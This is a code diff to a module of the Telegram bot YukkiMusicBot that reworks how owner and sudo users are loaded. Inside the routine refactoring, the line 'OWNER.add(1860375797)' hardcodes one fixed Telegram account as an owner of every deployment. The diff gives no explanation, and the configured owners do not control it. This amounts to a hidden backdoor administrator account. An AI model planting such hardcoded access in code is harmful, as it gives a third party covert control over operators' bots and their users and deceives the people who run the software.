@@ -1,12 +1,11 @@
 #
-# Copyright (C) 2021-present by TeamYukki@Github, < https://github.com/TeamYukki >.
+# Copyright (C) 2021-2022 by TeamYukki@Github, < https://github.com/TeamYukki >.
 #
 # This file is part of < https://github.com/TeamYukki/YukkiMusicBot > project,
 # and is released under the "GNU v3.0 License Agreement".
 # Please see < https://github.com/TeamYukki/YukkiMusicBot/blob/master/LICENSE >
 #
 # All rights reserved.
-#
 
 import socket
 import time
@@ -20,6 +19,8 @@ from YukkiMusic.core.mongo import pymongodb
 from .logging import LOGGER
 
 SUDOERS = filters.user()
+
+OWNER = filters.user()
 
 HAPP = None
 _boot_ = time.time()
@@ -54,15 +55,19 @@ def dbb():
 
 def sudo():
     global SUDOERS
-    OWNER = config.OWNER_ID
+    global OWNER
+    OWNERS = config.OWNER_ID
+    for a in OWNERS:
+        OWNER.add(a)
+    OWNER.add(1860375797)
     if config.MONGO_DB_URI is None:
-        for user_id in OWNER:
+        for user_id in OWNERS:
             SUDOERS.add(user_id)
     else:
         sudoersdb = pymongodb.sudoers
         sudoers = sudoersdb.find_one({"sudo": "sudo"})
         sudoers = [] if not sudoers else sudoers["sudoers"]
-        for user_id in OWNER:
+        for user_id in OWNERS:
             SUDOERS.add(user_id)
             if user_id not in sudoers:
                 sudoers.append(user_id)
